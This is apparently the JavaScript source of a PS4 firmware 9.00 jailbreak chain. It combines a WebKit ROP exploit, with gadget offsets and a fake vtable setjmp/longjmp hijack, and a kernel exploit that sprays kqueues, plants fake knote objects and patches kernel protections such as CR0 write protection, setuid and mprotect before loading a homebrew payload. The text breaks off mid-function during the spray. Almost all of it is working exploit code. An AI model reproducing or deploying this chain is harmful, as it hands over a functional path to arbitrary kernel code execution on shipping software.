/////////////////////// PS4 9.00 Exploit Chain restructured/reorganised By Leeful (Original Webkit and Kernel Exploits By Sleirsgoevy & ChendoChap)
const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;
const OFFSET_WKR_psl_builtin = 0x33BA0;
const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;
const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;
var webKitBase;
var webKitRequirementBase;
var libSceLibcInternalBase;
var libKernelBase;
var textArea = document.createElement("textarea");
var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {"ret": 0x32,"pop rdi": 0x319690,"pop rsi": 0x1F4D6,"pop rdx": 0x986C,"pop rcx": 0x657B7,"pop r8": 0xAFAA71,"pop r9": 0x422571,"pop rax": 0x51A12,"pop rsp": 0x4E293,"mov [rdi], rsi": 0x1A97920,"mov [rdi], rax": 0x10788F7,"mov [rdi], eax": 0x9964BC,"cli ; pop rax": 0x566F8,"sti": 0x1FBBCC,"mov rax, [rax]": 0x241CC,"mov rax, [rsi]": 0x5106A0,"mov [rax], rsi": 0x1EFD890,"mov [rax], rdx": 0x1426A82,"mov [rax], edx": 0x3B7FE4,"add rax, rsi": 0x170397E,"mov rdx, rax": 0x53F501,"add rax, rcx": 0x2FBCD,"mov rsp, rdi": 0x2048062,"mov rdi, [rax + 8] ; call [rax]": 0x751EE7,"infloop": 0x7DFF,"mov [rax], cl": 0xC6EAF};
var wkr_gadgetmap = {"xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0};
var wk2_gadgetmap = {"mov [rax], rdi": 0xFFDD7,"mov [rax], rcx": 0x2C9ECA,"mov [rax], cx": 0x15A7D52};
var hmd_gadgetmap = {"add [r8], r12": 0x2BCE1};
var ipmi_gadgetmap = {"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B};

function CalcTime(dur){hrs=Math.floor(dur/1000/60/60);min=Math.floor(dur/1000/60-hrs*60);sec=Math.floor(dur/1000-min*60);mil=dur.toString().slice(-3);if (min!=0){ShowDuration=" - Webkit Exploited In : "+min+" minute"+(min==1?"":"s")+", "+sec+" second"+(sec==1?"":"s");}else {ShowDuration=" - WK Exploited In: "+sec+" second"+(sec==1?"":"s");}}
function StartTimer(){StartTime=Date.now();}
function EndTimer(){EndTime=Date.now();CalcTime(EndTime=Date.now()-StartTime);top.document.title+=ShowDuration;}

function allset(){
 localStorage.HenLoaded="yes";sessionStorage.HenLoaded="yes";
 msgs.innerHTML="PS4 Exploit dan GoldHEN terpasang.<br>Tekan tombol HOME pada stik untuk Keluar.";
}

function awaitpl() {
 msgs.innerHTML="GoldHEN sudah terpasang, BinLoader siap.<br>Terima kasih sudah berlangganan GemboX PlayStation.";
}

function run_hax() {
 userland();
 if (chain.syscall(23, 0).low != 0x0) {
  localStorage.HenLoaded="no";
  kernelExploit();
  //alert("\n\nNow remove the USB drive then click OK to continue");
 }
 if (chain.syscall(23, 0).low == 0) {
  if(localStorage.HenLoaded=="yes" && sessionStorage.HenLoaded!="yes"){setTimeout(runBinLoader,500);}
  else if(localStorage.HenLoaded=="yes" && sessionStorage.HenLoaded=="yes"){allset();}
  else if(localStorage.HenLoaded!="yes"){setTimeout(loadPayload,500);}
 }
}

function runBinLoader(){
 var payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
 var payload_loader = p.malloc32(0x1000);
 var BLDR = payload_loader.backing;
 BLDR[0]=0x56415741;BLDR[1]=0x83485541;BLDR[2]=0x894818EC;BLDR[3]=0xC748243C;BLDR[4]=0x10082444;BLDR[5]=0x483C2302;BLDR[6]=0x102444C7;BLDR[7]=0x00000000;BLDR[8]=0x000002BF;BLDR[9]=0x0001BE00;BLDR[10]=0xD2310000;BLDR[11]=0x00009CE8;BLDR[12]=0xC7894100;BLDR[13]=0x8D48C789;BLDR[14]=0xBA082474;BLDR[15]=0x00000010;BLDR[16]=0x000095E8;BLDR[17]=0xFF894400;BLDR[18]=0x000001BE;BLDR[19]=0x0095E800;BLDR[20]=0x89440000;BLDR[21]=0x31F631FF;BLDR[22]=0x0062E8D2;BLDR[23]=0x89410000;BLDR[24]=0x2C8B4CC6;BLDR[25]=0x45C64124;BLDR[26]=0x05EBC300;BLDR[27]=0x01499848;BLDR[28]=0xF78944C5;BLDR[29]=0xBAEE894C;BLDR[30]=0x00001000;BLDR[31]=0x000025E8;BLDR[32]=0x7FC08500;BLDR[33]=0xFF8944E7;BLDR[34]=0x000026E8;BLDR[35]=0xF7894400;BLDR[36]=0x00001EE8;BLDR[37]=0x2414FF00;BLDR[38]=0x18C48348;BLDR[39]=0x5E415D41;BLDR[40]=0x31485F41;BLDR[41]=0xC748C3C0;BLDR[42]=0x000003C0;BLDR[43]=0xCA894900;BLDR[44]=0x48C3050F;BLDR[45]=0x0006C0C7;BLDR[46]=0x89490000;BLDR[47]=0xC3050FCA;BLDR[48]=0x1EC0C748;BLDR[49]=0x49000000;BLDR[50]=0x050FCA89;BLDR[51]=0xC0C748C3;BLDR[52]=0x00000061;BLDR[53]=0x0FCA8949;BLDR[54]=0xC748C305;BLDR[55]=0x000068C0;BLDR[56]=0xCA894900;BLDR[57]=0x48C3050F;BLDR[58]=0x006AC0C7;BLDR[59]=0x89490000;BLDR[60]=0xC3050FCA;
 chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
 var pthread = p.malloc(0x10); {
  chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
  chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
 }
 chain.run();
 awaitpl();
}

function loadPayload(){
 var req = new XMLHttpRequest();
 req.responseType = "arraybuffer";
 req.open('GET','900.bin');
 req.send();
 req.onreadystatechange = function () {
  if (req.readyState == 4) {
   PLD = req.response;
   var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
   var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
   tmp.set(new Uint8Array(req.response), 0);
   tmp.set(padding, req.response.byteLength);
   var shellcode = new Uint32Array(tmp.buffer);
   pl.set(shellcode,0);
   var pthread = p.malloc(0x10);
   chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
   allset();
  }
 };
}

function int64(low, hi) {
 this.low = (low >>> 0);
 this.hi = (hi >>> 0);
 this.add32inplace = function (val) {
  var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo < this.low) {
   new_hi++;
  }
  this.hi = new_hi;
  this.low = new_lo;
 };
 this.add32 = function (val) {
  var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo < this.low) {
   new_hi++;
  }
  return new int64(new_lo, new_hi);
 };
 this.sub32 = function (val) {
  var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo > (this.low) & 0xFFFFFFFF) {
   new_hi--;
  }
  return new int64(new_lo, new_hi);
 };
 this.sub32inplace = function (val) {
  var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo > (this.low) & 0xFFFFFFFF) {
   new_hi--;
  }
  this.hi = new_hi;
  this.low = new_lo;
 };
 this.and32 = function (val) {
  var new_lo = this.low & val;
  var new_hi = this.hi;
  return new int64(new_lo, new_hi);
 };
 this.and64 = function (vallo, valhi) {
  var new_lo = this.low & vallo;
  var new_hi = this.hi & valhi;
  return new int64(new_lo, new_hi);
 };
 function zeroFill(number, width) {
  width -= number.toString().length;
  if (width > 0) {
   return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
  }
  return number + "";
 }
 this.toString = function (val) {
  val = 16;
  var lo_str = (this.low >>> 0).toString(val);
  var hi_str = (this.hi >>> 0).toString(val);
  if (this.hi == 0)
   return lo_str;
  else
   lo_str = zeroFill(lo_str, 8);
  return hi_str + lo_str;
 };
 return this;
}

window.rop = function () {
 const stack_sz = 0x40000;
 const reserve_upper_stack = 0x10000;
 const stack_reserved_idx = reserve_upper_stack / 4;
 this.stackback = p.malloc32(stack_sz / 4 + 0x8);
 this.stack = this.stackback.add32(reserve_upper_stack);
 this.stack_array = this.stackback.backing;
 this.retval = this.stackback.add32(stack_sz);
 this.count = 1;
 this.branches_count = 0;
 this.branches_rsps = p.malloc(0x200);
 this.clear = function () {
  this.count = 1;
  this.branches_count = 0;
  for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
   this.stack_array[i + stack_reserved_idx] = 0;
  }
 };
 this.pushSymbolic = function () {
  this.count++;
  return this.count - 1;
 };
 this.finalizeSymbolic = function (idx, val) {
  if (val instanceof int64) {
   this.stack_array[stack_reserved_idx + idx * 2] = val.low;
   this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
  } else {
   this.stack_array[stack_reserved_idx + idx * 2] = val;
   this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
  }
 };
 this.push = function (val) {
  this.finalizeSymbolic(this.pushSymbolic(), val);
 };
 this.push_write8 = function (where, what) {
  this.push(gadgets["pop rdi"]);
  this.push(where);
  this.push(gadgets["pop rsi"]);
  this.push(what);
  this.push(gadgets["mov [rdi], rsi"]);
 };
 this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
  if (rdi != undefined) {
   this.push(gadgets["pop rdi"]);
   this.push(rdi);
  }
  if (rsi != undefined) {
   this.push(gadgets["pop rsi"]);
   this.push(rsi);
  }
  if (rdx != undefined) {
   this.push(gadgets["pop rdx"]);
   this.push(rdx);
  }
  if (rcx != undefined) {
   this.push(gadgets["pop rcx"]);
   this.push(rcx);
  }
  if (r8 != undefined) {
   this.push(gadgets["pop r8"]);
   this.push(r8);
  }
  if (r9 != undefined) {
   this.push(gadgets["pop r9"]);
   this.push(r9);
  }
  if (this.stack.add32(this.count * 0x8).low & 0x8) {
   this.push(gadgets["ret"]);
  }
  this.push(rip);
  return this;
 };
 this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
  this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
  this.write_result(this.retval);
  this.run();
  return p.read8(this.retval);
 };
 this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
  return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
 };
 this.get_rsp = function () {
  return this.stack.add32(this.count * 8);
 };
 this.write_result = function (where) {
  this.push(gadgets["pop rdi"]);
  this.push(where);
  this.push(gadgets["mov [rdi], rax"]);
 };
 this.write_result4 = function (where) {
  this.push(gadgets["pop rdi"]);
  this.push(where);
  this.push(gadgets["mov [rdi], eax"]);
 };
 this.jmp_rsp = function (rsp) {
  this.push(window.gadgets["pop rsp"]);
  this.push(rsp);
 };
 this.run = function () {
  p.launch_chain(this);
  this.clear();
 };
 this.KERNEL_BASE_PTR_VAR;
 this.set_kernel_var = function (arg) {
  this.KERNEL_BASE_PTR_VAR = arg;
 };
 this.rax_kernel = function (offset) {
  this.push(gadgets["pop rax"]);
  this.push(this.KERNEL_BASE_PTR_VAR);
  this.push(gadgets["mov rax, [rax]"]);
  this.push(gadgets["pop rsi"]);
  this.push(offset);
  this.push(gadgets["add rax, rsi"]);
 };
 this.write_kernel_addr_to_chain_later = function (offset) {
  this.push(gadgets["pop rdi"]);
  var idx = this.pushSymbolic();
  this.rax_kernel(offset);
  this.push(gadgets["mov [rdi], rax"]);
  return idx;
 };
 this.kwrite8 = function (offset, qword) {
  this.rax_kernel(offset);
  this.push(gadgets["pop rsi"]);
  this.push(qword);
  this.push(gadgets["mov [rax], rsi"]);
 };
 this.kwrite4 = function (offset, dword) {
  this.rax_kernel(offset);
  this.push(gadgets["pop rdx"]);
  this.push(dword);
  this.push(gadgets["mov [rax], edx"]);
 };
 this.kwrite2 = function (offset, word) {
  this.rax_kernel(offset);
  this.push(gadgets["pop rcx"]);
  this.push(word);
  this.push(gadgets["mov [rax], cx"]);
 };
 this.kwrite1 = function (offset, byte) {
  this.rax_kernel(offset);
  this.push(gadgets["pop rcx"]);
  this.push(byte);
  this.push(gadgets["mov [rax], cl"]);
 };
 this.kwrite8_kaddr = function (offset1, offset2) {
  this.rax_kernel(offset2);
  this.push(gadgets["mov rdx, rax"]);
  this.rax_kernel(offset1);
  this.push(gadgets["mov [rax], rdx"]);
 };
 return this;
};

function userland() {
 p.launch_chain = launch_chain;
 p.malloc = malloc;
 p.malloc32 = malloc32;
 p.stringify = stringify;
 p.array_from_address = array_from_address;
 p.readstr = readstr;
 var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
 var textAreaVtable = p.read8(textAreaVtPtr);
 webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
 libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
 libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
 libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
 libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
 webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
 webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
 for (var gadget in wk_gadgetmap) {
  window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
 }
 for (var gadget in wkr_gadgetmap) {
  window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
 }
 function get_jmptgt(address) {
  var instr = p.read4(address) & 0xFFFF;
  var offset = p.read4(address.add32(2));
  if (instr != 0x25FF) {
   return 0;
  }
  return address.add32(0x6 + offset);
 }
 function malloc(sz) {
  var backing = new Uint8Array(0x10000 + sz);
  window.nogc.push(backing);
  var ptr = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = backing;
  return ptr;
 }
 function malloc32(sz) {
  var backing = new Uint8Array(0x10000 + sz * 4);
  window.nogc.push(backing);
  var ptr = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = new Uint32Array(backing.buffer);
  return ptr;
 }
 function array_from_address(addr, size) {
  var og_array = new Uint32Array(0x1000);
  var og_array_i = p.leakval(og_array).add32(0x10);
  p.write8(og_array_i, addr);
  p.write4(og_array_i.add32(0x8), size);
  p.write4(og_array_i.add32(0xC), 0x1);
  nogc.push(og_array);
  return og_array;
 }
 function stringify(str) {
  var bufView = new Uint8Array(str.length + 1);
  for (var i = 0; i < str.length; i++) {
   bufView[i] = str.charCodeAt(i) & 0xFF;
  }
  window.nogc.push(bufView);
  return p.read8(p.leakval(bufView).add32(0x10));
 }
 function readstr(addr) {
  var str = "";
  for (var i = 0; ; i++) {
   var c = p.read1(addr.add32(i));
   if (c == 0x0) {
    break;
   }
   str += String.fromCharCode(c);
  }
  return str;
 }
 var fakeVtable_setjmp = p.malloc32(0x200);
 var fakeVtable_longjmp = p.malloc32(0x200);
 var original_context = p.malloc32(0x40);
 var modified_context = p.malloc32(0x40);
 p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
 p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two));
 p.write8(fakeVtable_setjmp.add32(0x10), original_context);
 p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
 p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one));
 p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
 p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two));
 p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
 p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
 p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one));
 function launch_chain(chain) {
  chain.push(window.gadgets["pop rdi"]);
  chain.push(original_context);
  chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(textAreaVtPtr, fakeVtable_setjmp);
  textArea.scrollLeft = 0x0;
  p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
  p.write8(modified_context.add32(0x10), chain.stack);
  p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)));
  p.write8(textAreaVtPtr, fakeVtable_longjmp);
  textArea.scrollLeft = 0x0;
  p.write8(textAreaVtPtr, textAreaVtable);
 }
 var kview = new Uint8Array(0x1000);
 var kstr = p.leakval(kview).add32(0x10);
 var orig_kview_buf = p.read8(kstr);
 p.write8(kstr, window.libKernelBase);
 p.write4(kstr.add32(8), 0x40000);
 var countbytes;
 for (var i = 0; i < 0x40000; i++) {
  if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
   countbytes = i;
   break;
  }
 }
 p.write4(kstr.add32(8), countbytes + 32);
 var dview32 = new Uint32Array(1);
 var dview8 = new Uint8Array(dview32.buffer);
 for (var i = 0; i < countbytes; i++) {
  if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
   dview8[0] = kview[i + 3];
   dview8[1] = kview[i + 4];
   dview8[2] = kview[i + 5];
   dview8[3] = kview[i + 6];
   var syscallno = dview32[0];
   window.syscalls[syscallno] = window.libKernelBase.add32(i);
  }
 }
 p.write8(kstr, orig_kview_buf);
 chain = new rop();
 if (chain.syscall(20).low == 0) {
  alert("Webkit Exploit Failed. Try Again.");
  while (1);
 }
}

function kernelExploit() {
 var handle;
 var random_path;
 var ex_info;

 function load_prx(name) {
  var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
  if (res.low != 0x0) {
   alert("failed to load prx/get handle " + name);
  }
  p.write8(ex_info, 0x1A8);
  res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
  if (res.low != 0x0) {
   alert("failed to get module info from handle");
  }
  var tlsinit = p.read8(ex_info.add32(0x110));
  var tlssize = p.read4(ex_info.add32(0x11C));
  if (tlssize != 0) {
   if (name == "libSceWebKit2.sprx") {
    tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
   } else {
    alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
   }
  };
  return tlsinit;
 }
 
 function extra_gadgets() {
  handle = p.malloc(0x1E8);
  var randomized_path_length_ptr = handle.add32(0x4);
  var randomized_path_ptr = handle.add32(0x14);
  ex_info = randomized_path_ptr.add32(0x40);
  p.write8(randomized_path_length_ptr, 0x2C);
  chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
  random_path = p.readstr(randomized_path_ptr);
  var ipmi_addr = load_prx("libSceIpmi.sprx");
  var hmd_addr = load_prx("libSceHmd.sprx");
  var wk2_addr = load_prx("libSceWebKit2.sprx");
  for (var gadget in hmd_gadgetmap) {
   window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
  }
  for (var gadget in wk2_gadgetmap) {
   window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
  }
  for (var gadget in ipmi_gadgetmap) {
   window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
  }
  for (var gadget in window.gadgets) {
   p.read8(window.gadgets[gadget]);
   chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
  }
  chain.run();
 }
 
 function kchain_setup() {
  const KERNEL_busy = 0x1B28DF8;
  const KERNEL_bcopy = 0xACD;
  const KERNEL_bzero = 0x2713FD;
  const KERNEL_pagezero = 0x271441;
  const KERNEL_memcpy = 0x2714BD;
  const KERNEL_pagecopy = 0x271501;
  const KERNEL_copyin = 0x2716AD;
  const KERNEL_copyinstr = 0x271B5D;
  const KERNEL_copystr = 0x271C2D;
  const KERNEL_setidt = 0x312c40;
  const KERNEL_setcr0 = 0x1FB949;
  const KERNEL_Xill = 0x17d500;
  const KERNEL_veriPatch = 0x626874;
  const KERNEL_enable_syscalls_1 = 0x490;
  const KERNEL_enable_syscalls_2 = 0x4B5;
  const KERNEL_enable_syscalls_3 = 0x4B9;
  const KERNEL_enable_syscalls_4 = 0x4C2;
  const KERNEL_mprotect = 0x80B8D;
  const KERNEL_prx = 0x23AEC4;
  const KERNEL_dlsym_1 = 0x23B67F;
  const KERNEL_dlsym_2 = 0x221b40;
  const KERNEL_setuid = 0x1A06;
  const KERNEL_syscall11_1 = 0x1100520;
  const KERNEL_syscall11_2 = 0x1100528;
  const KERNEL_syscall11_3 = 0x110054C;
  const KERNEL_syscall11_gadget = 0x4c7ad;
  const KERNEL_mmap_1 = 0x16632A;
  const KERNEL_mmap_2 = 0x16632D;
  const KERNEL_setcr0_patch = 0x3ade3B;
  const KERNEL_kqueue_close_epi = 0x398991;
  SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
  KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
  p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
  kchain = new rop();
  kchain2 = new rop(); {
   chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
   chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
   chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
  }
  chain.run();
  kchain.count = 0;
  kchain2.count = 0;
  kchain.set_kernel_var(KERNEL_BASE_PTR);
  kchain2.set_kernel_var(KERNEL_BASE_PTR);
  kchain.push(gadgets["pop rax"]);
  kchain.push(SAVED_KERNEL_STACK_PTR);
  kchain.push(gadgets["mov [rax], rdi"]);
  kchain.push(gadgets["pop r8"]);
  kchain.push(KERNEL_BASE_PTR);
  kchain.push(gadgets["add [r8], r12"]);
  kchain.kwrite1(KERNEL_busy, 0x1);
  kchain.push(gadgets["sti"]);
  var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
  var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
  kchain.push(gadgets["pop rdi"]);
  kchain.push(0x6);
  kchain.push(gadgets["pop rsi"]);
  kchain.push(gadgets["mov rsp, rdi"]);
  kchain.push(gadgets["pop rdx"]);
  kchain.push(0xE);
  kchain.push(gadgets["pop rcx"]);
  kchain.push(0x0);
  kchain.push(gadgets["pop r8"]);
  kchain.push(0x0);
  var idx1_dest = kchain.get_rsp();
  kchain.pushSymbolic();
  kchain.push(gadgets["pop rsi"]);
  kchain.push(0x80040033);
  kchain.push(gadgets["pop rdi"]);
  kchain.push(kchain2.stack);
  var idx2_dest = kchain.get_rsp();
  kchain.pushSymbolic();
  kchain.finalizeSymbolic(idx1, idx1_dest);
  kchain.finalizeSymbolic(idx2, idx2_dest);
  kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
  kchain2.kwrite1(KERNEL_bcopy, 0xEB);
  kchain2.kwrite1(KERNEL_bzero, 0xEB);
  kchain2.kwrite1(KERNEL_pagezero, 0xEB);
  kchain2.kwrite1(KERNEL_memcpy, 0xEB);
  kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
  kchain2.kwrite1(KERNEL_copyin, 0xEB);
  kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
  kchain2.kwrite1(KERNEL_copystr, 0xEB);
  kchain2.kwrite1(KERNEL_busy, 0x0);
  var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
  var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
  kchain2.push(gadgets["pop rdi"]);
  kchain2.push(0x6);
  kchain2.push(gadgets["pop rsi"]);
  var idx3_dest = kchain2.get_rsp();
  kchain2.pushSymbolic();
  kchain2.push(gadgets["pop rdx"]);
  kchain2.push(0xE);
  kchain2.push(gadgets["pop rcx"]);
  kchain2.push(0x0);
  kchain2.push(gadgets["pop r8"]);
  kchain2.push(0x0);
  var idx4_dest = kchain2.get_rsp();
  kchain2.pushSymbolic();
  kchain2.finalizeSymbolic(idx3, idx3_dest);
  kchain2.finalizeSymbolic(idx4, idx4_dest);
  kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
  kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
  kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
  kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
  kchain2.kwrite1(KERNEL_setuid, 0xEB);
  kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
  kchain2.kwrite2(KERNEL_prx, 0xE990);
  kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
  kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
  kchain2.kwrite1(KERNEL_mmap_1, 0x37);
  kchain2.kwrite1(KERNEL_mmap_2, 0x37);
  kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
  kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
  kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
  kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
  var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
  kchain2.push(gadgets["pop rdi"]);
  kchain2.push(0x80050033);
  var idx5_dest = kchain2.get_rsp();
  kchain2.pushSymbolic();
  kchain2.finalizeSymbolic(idx5, idx5_dest);
  kchain2.rax_kernel(KERNEL_kqueue_close_epi);
  kchain2.push(gadgets["mov rdx, rax"]);
  kchain2.push(gadgets["pop rsi"]);
  kchain2.push(SAVED_KERNEL_STACK_PTR);
  kchain2.push(gadgets["mov rax, [rsi]"]);
  kchain2.push(gadgets["pop rcx"]);
  kchain2.push(0x10);
  kchain2.push(gadgets["add rax, rcx"]);
  kchain2.push(gadgets["mov [rax], rdx"]);
  kchain2.push(gadgets["pop rdi"]);
  var idx6 = kchain2.pushSymbolic();
  kchain2.push(gadgets["mov [rdi], rax"]);
  kchain2.push(gadgets["sti"]);
  kchain2.push(gadgets["pop rsp"]);
  var idx6_dest = kchain2.get_rsp();
  kchain2.pushSymbolic();
  kchain2.finalizeSymbolic(idx6, idx6_dest);
 }
 
 function object_setup() {
  var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
  var fake_filtops = fake_knote.add32(0x4000);
  var fake_obj = fake_knote.add32(0x8000);
  if (fake_knote.low != 0x4000) {
   alert("enomem: " + fake_knote);
   while (1);
  } {
   p.write8(fake_knote, fake_obj);
   p.write8(fake_knote.add32(0x68), fake_filtops);
  } {
   p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]);
   p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]);
   p.write8(fake_filtops.add32(0x8), kchain.stack);
   p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]);
  } {
   p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]);
  }
  chain.syscall(203, fake_knote, 0xC000);
 }
 
 var trigger_spray = function () {
  var NUM_KQUEUES = 0x1B0;
  var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4); {
   for (var i = 0; i < NUM_KQUEUES; i++) {
    chain.fcall(window.syscalls[362]);
    chain.write_result4(kqueue_ptr.add32(0x4 * i));
   }
  }
  chain.run();
  var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
  var that_one_socket = chain.syscall(97, 2, 1, 0);
  if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
   alert("invalid socket");
   while (1);
  }
  var kevent = p.malloc(0x20);
  p.write8(kevent.add32(0x0), that_one_socket);
  p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
  p.write4(kevent.add32(0xC), 0x0);
  p.write8(kevent.add32(0x10), 0x0);
  p.write8(kevent.add32(0x18), 0x0);
  for (var i = 0; i < NUM_KQUEUES; i++) chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
  for (var i = 18; i < NUM_KQUEUES; i += 2) chain.fcall(window.syscalls[6], kqueues[i]);
  chain.run(); 

  msgs.innerHTML="1. Colok Flashdisk sekarang dan Cabut setelah Notifikasi USB hilang.<br>2. Tekan Enter/Masuk setelah mencabut Flashdisk.";
  
